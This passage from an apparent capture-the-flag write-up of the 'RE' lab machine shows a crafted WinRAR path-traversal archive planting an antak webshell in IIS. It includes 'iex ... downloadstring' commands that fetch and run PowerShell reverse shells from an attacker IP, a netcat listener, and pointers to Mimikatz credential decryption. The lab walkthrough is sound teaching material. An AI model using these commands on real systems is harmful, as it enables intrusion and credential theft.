                <span style="color:#8be9fd;font-style:italic">Start-Sleep</span> -s 5

                <span style="color:#6272a4">#&amp; &#39;C:\Program Files (x86)\WinRAR\Rar.exe&#39; a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span>
                <span style="color:#8be9fd;font-style:italic">Compress-Archive</span> -Path <span style="color:#f1fa8c">&#34;$process_dir\*.ods&#34;</span> -DestinationPath <span style="color:#f1fa8c">&#34;$process_dir\temp.zip&#34;</span>
                <span style="color:#8be9fd;font-style:italic">$hash</span> = (<span style="color:#8be9fd;font-style:italic">Get-FileHash</span> -Algorithm MD5 <span style="color:#8be9fd;font-style:italic">$process_dir</span>\temp.zip).hash
                <span style="color:#6272a4"># Upstream processing may expect rars. Rename to .rar</span>
                <span style="color:#8be9fd;font-style:italic">Move-Item</span> -Force -Path <span style="color:#8be9fd;font-style:italic">$process_dir</span>\temp.zip -Destination <span style="color:#8be9fd;font-style:italic">$files_to_analyze</span>\<span style="color:#8be9fd;font-style:italic">$hash</span>.rar
        }

        <span style="color:#8be9fd;font-style:italic">Remove-Item</span> -Recurse -force -Path <span style="color:#8be9fd;font-style:italic">$process_dir</span>\*
        <span style="color:#8be9fd;font-style:italic">Start-Sleep</span> -s 5
}
</code></pre></td></tr></table>
</div>
</div><p>Installation of Searchsploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
sed <span style="color:#f1fa8c">&#39;s|path_array+=(.*)|path_array+=(&#34;/opt/exploitdb&#34;)|g&#39;</span> /opt/exploitdb/.searchsploit_rc &gt; ~/.searchsploit_rc
sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
<span style="color:#6272a4">#For MacOsX, simply --&gt; brew update &amp;&amp; brew install exploitdb</span>
</code></pre></td></tr></table>
</div>
</div><p>We try to access the web root folder, but No access inside those 3 folders.
We add 3 virtual hosts (blog|ip|re).htb in our /etc/hosts but there is no site available yet.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\luke\Documents&gt; <span style="color:#8be9fd;font-style:italic">dir </span><span style="color:#f1fa8c">&#34;C:/inetpub/wwwroot/&#34;</span>

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/26/2019   5:58 PM                blog
d-----        3/27/2019   2:10 PM                ip
d-----        6/18/2019  10:18 PM                re
</code></pre></td></tr></table>
</div>
</div><p>Looking at <a href="http://re.htb">http://re.htb</a> html source code, we have hint on Ghidra:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    &lt;<span style="color:#ff79c6">title</span>&gt;Ghidra Dropbox Coming Soon!&lt;/<span style="color:#ff79c6">title</span>&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;
  &lt;<span style="color:#ff79c6">body</span>&gt;
    &lt;<span style="color:#ff79c6">p</span>&gt;Please check back soon for re.htb updates.&lt;/<span style="color:#ff79c6">p</span>&gt;
    <span style="color:#6272a4">&lt;!--future capability
</span><span style="color:#6272a4">	&lt;p&gt; To upload Ghidra project:
</span><span style="color:#6272a4">	&lt;ol&gt;
</span><span style="color:#6272a4">	  &lt;li&gt; exe should be at project root.Directory stucture should look something like:
</span><span style="color:#6272a4">	      &lt;code&gt;&lt;pre&gt;
</span><span style="color:#6272a4">|   vulnerserver.gpr
</span><span style="color:#6272a4">|   vulnserver.exe
</span><span style="color:#6272a4">\---vulnerserver.rep
</span><span style="color:#6272a4">    |   project.prp
</span><span style="color:#6272a4">    |   projectState
</span><span style="color:#6272a4">    |
</span><span style="color:#6272a4">    +---idata
</span><span style="color:#6272a4">    |   |   ~index.bak
</span><span style="color:#6272a4">    |   |   ~index.dat
</span><span style="color:#6272a4">    |   |
</span><span style="color:#6272a4">    |   \---00
</span><span style="color:#6272a4">    |       |   00000000.prp
</span><span style="color:#6272a4">    |       |
</span><span style="color:#6272a4">    |       \---~00000000.db
</span><span style="color:#6272a4">    |               db.2.gbf
</span><span style="color:#6272a4">    |               db.3.gbf
</span><span style="color:#6272a4">    |
</span><span style="color:#6272a4">    +---user
</span><span style="color:#6272a4">    |       ~index.dat
</span><span style="color:#6272a4">    |
</span><span style="color:#6272a4">    \---versioned
</span><span style="color:#6272a4">            ~index.bak
</span><span style="color:#6272a4">            ~index.dat
</span><span style="color:#6272a4">		  &lt;/pre&gt;&lt;/code&gt;
</span><span style="color:#6272a4">	  &lt;/li&gt;
</span><span style="color:#6272a4">	  &lt;li&gt;Add entire directory into zip archive.&lt;/li&gt;
</span><span style="color:#6272a4">	  &lt;li&gt; Upload zip here:&lt;/li&gt;
</span><span style="color:#6272a4">    &lt;/ol&gt; --&gt;</span>
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>From here, strategy would be to try to upload a file in this web application root folder to escalate to IIS privileges.
We know the execution process except upfront a RAR file, so if we are successful to exploit a directory traversal,
maybe we can uncompress a ASP.NET webshell outside of the current directory into the web root folder.</p>
<h1 id="searching-for-further-vulnerabilities">Searching for further vulnerabilities</h1>
<p>We want to upload winPEAS.bat but we are not successful, but we are not successful with the command:</p>
<pre tabindex="0"><code>iex(new-object net.webclient).downloadstring('http://10.10.14.73:8080/shell.ps1')
</code></pre><p>Instead we can use any alternative such as <code>wget -o winPEAS.bat http://10.10.14.73:8080/winPEAS.bat</code> or the following:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\L</span>uke<span style="color:#f1fa8c">\D</span>esktop&gt; Invoke-RestMethod -Uri http://10.10.14.73:8080/winPEAS.bat -Method Get &gt; winPEAS.bat
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\L</span>uke<span style="color:#f1fa8c">\D</span>esktop&gt; <span style="color:#8be9fd;font-style:italic">type</span> winPEAS.bat
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\L</span>uke<span style="color:#f1fa8c">\D</span>esktop&gt; winPEAS.bat
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\L</span>uke<span style="color:#f1fa8c">\M</span>usic&gt; cmd /c winPEAS.bat
</code></pre></td></tr></table>
</div>
</div><p>We get a lot of useful information such as:</p>
<ul>
<li>softwares: Notepad++ PeaZip Sysinternals WinRAR WinRAR1</li>
<li>admins:Administrator coby</li>
<li>remote users: coby</li>
<li>users: cam luke</li>
</ul>
<p>We probably want to escalate to user coby as he is admin</p>
<p>We also have DPAPI information which is useful for Mimikatz exploitation of EFS:
see <a href="https://ippsec.rocks/">Using Mimikatz to decrypt the EFS Protected file with Tolu&rsquo;s password</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    <span style="color:#8be9fd;font-style:italic">State</span>
<span style="color:#ff79c6">=============================</span> <span style="color:#ff79c6">==============================</span> <span style="color:#ff79c6">========</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span style="color:#8be9fd;font-style:italic">set</span> Disabled

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> DPAPI MASTER KEYS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Use the Mimikatz <span style="color:#f1fa8c">&#39;dpapi::masterkey&#39;</span> module with appropriate arguments <span style="color:#ff79c6">(</span>/rpc<span style="color:#ff79c6">)</span> to decrypt
  <span style="color:#ff79c6">[</span>?<span style="color:#ff79c6">]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi

    Directory: C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\R</span>oaming<span style="color:#f1fa8c">\M</span>icrosoft<span style="color:#f1fa8c">\P</span>rotect

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        3/13/2019   6:45 PM                S-1-5-21-311800348-2366743891-1978325779-1001

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> DPAPI MASTER KEYS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Use the Mimikatz <span style="color:#f1fa8c">&#39;dpapi::cred&#39;</span> module with appropriate /masterkey to decrypt
<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> You can also extract many DPAPI masterkeys from memory with the Mimikatz <span style="color:#f1fa8c">&#39;sekurlsa::dpapi&#39;</span> module
  <span style="color:#ff79c6">[</span>?<span style="color:#ff79c6">]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
Looking inside C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\R</span>oaming<span style="color:#f1fa8c">\M</span>icrosoft<span style="color:#f1fa8c">\C</span>redentials<span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>Looking inside C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\L</span>ocal<span style="color:#f1fa8c">\M</span>icrosoft<span style="color:#f1fa8c">\C</span>redentials<span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>DFBE70A7E5CC19A398EBF1B96859CE5D
</code></pre></td></tr></table>
</div>
</div><p>We can clone evil-WinRAR-Gen, PayloadAllTheThing and TENNC git repos.</p>
<ul>
<li>[PayloadAllTheThings](git clone <a href="https://github.com/swisskyrepo/PayloadsAllTheThings.git">https://github.com/swisskyrepo/PayloadsAllTheThings.git</a>) - the shell.asp did not work for us</li>
<li><a href="https://github.com/manulqwerty/Evil-WinRAR-Gen">Evil-WinRAR-Gen</a></li>
<li><a href="https://github.com/tennc/webshell.git">TENNC collection of shells</a></li>
</ul>
<p>We can use evil-winrar to write a reverse shell in IIS server:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find /opt/tennc | grep antak
python evilWinRAR.py -o ~/htb/evil-winrar/shell.rar -e ~/htb/evil-winrar/antak.aspx -g ~/htb/evil-winrar/good.txt -p <span style="color:#f1fa8c">&#39;C:\inetpub\wwwroot\ip\&#39;</span>
<span style="color:#6272a4">#we put a &#39;\&#39; caracter at the end of the path because it is required. We could audit this requirement with:</span>
xxd -c <span style="color:#bd93f9">32</span> &lt;RAR_FILE&gt;
mv ~/htp/evil-winrar/shell.rar ~/htb/http/
</code></pre></td></tr></table>
</div>
</div><p>We can now go in Luke ods folder and fetch the rar file with the command: <code>wget -o shell.rar http://10.10.14.73:8080/shell.rar</code>.
The RAR is automatically uncompressed by the process_sample.ps1 file, and we can verify we have an effective webshell on our browser <code>http://ip.htb/antak.aspx</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS&gt; whoami
iis apppool<span style="color:#f1fa8c">\i</span>p
</code></pre></td></tr></table>
</div>
</div><p>We prepare a new TCP reverse Shell that listens on port 8001.
Then, we use our new antak.aspx webshell to get a command-line <code>iex(new-object net.webclient).downloadstring('http://10.10.14.73:8080/iis.ps1')</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:/$ cp ~/htp/http/shell.ps1 ~/htb/http/iis.ps1
ctf@6274ae97a895:/$ vi ~/htb/http/iis.ps1
ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style="color:#bd93f9">8001</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8001</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">64563</span>
Windows PowerShell running as user RE$ on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt;whoami
iis apppool<span style="color:#f1fa8c">\i</span>p
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt;
</code></pre></td></tr></table>
</div>
</div><p>We can then &lsquo;cd C:\proj_drop', but we don&rsquo;t have read/write access &hellip;
we therefore repeat the operation to generate an evil Rar document,
but we change the path to point to the &lsquo;C:\inetpub\wwwroot\re' folder.
This time we connect our browser to <code>http://ip.htb/antak.aspx</code>,
then type:<code>iex(new-object net.webclient).downloadstring('http://10.10.14.73:8080/iis.ps1')</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt;whoami
iis apppool<span style="color:#f1fa8c">\r</span>e
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt;
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; <span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\&gt;</span> <span style="color:#8be9fd;font-style:italic">cd</span> proj_drop
PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; ls
PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;test&#39;</span> &gt; <span style="color:#8be9fd;font-style:italic">test</span>
</code></pre></td></tr></table>
</div>
</div><p>We can now attempt to exploit this ghidra RCE by crafting a ghidra project.
A better description of the issue is available here <a href="https://github.com/NationalSecurityAgency/ghidra/issues/71">Ghidra XXE exploit</a></p>
